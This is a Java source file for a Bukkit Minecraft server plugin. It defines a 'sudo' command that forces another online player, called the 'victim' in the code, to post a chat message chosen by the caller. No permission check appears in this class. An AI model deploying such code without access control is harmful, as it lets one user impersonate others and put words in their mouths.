package de.Garkolym.Commands.Server;

import java.util.ArrayList;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import de.Garkolym.Start;
import de.Garkolym.Commands.Command;
import de.Garkolym.Commands.CommandCategory;
import net.md_5.bungee.api.ChatColor;

public class CommandSUDO extends Command {

	// von KayCrafterHD
	public CommandSUDO() {
		super("sudo", CommandCategory.SERVER);
	}

	@Override
	public void onCommand(Player p, ArrayList<String> args) {
		if (args.size() > 1) {
			try {
				String msg = "";
				p.sendMessage(args.get(0));
				Player victim = Bukkit.getPlayer(args.get(0));
				for (int i = 1; i < args.size(); i++) {
					if (i != args.size()) {
						msg += args.get(i) + " ";						
					}
					else
					{
						msg += args.get(i);
					}
				}
				victim.chat(msg);
				p.sendMessage(ChatColor.GREEN + "Dieser Spieler hat nun die Nachricht abgesendet!");
			} catch (Exception e) {
				p.sendMessage(Start.instance.prefix + ChatColor.RED + "Dieser Spieler ist nicht online!");
			}
		}
		else
		{
			p.sendMessage(Start.instance.prefix + ChatColor.RED + "Die Syntax ist falsch!");
		}
	}
}
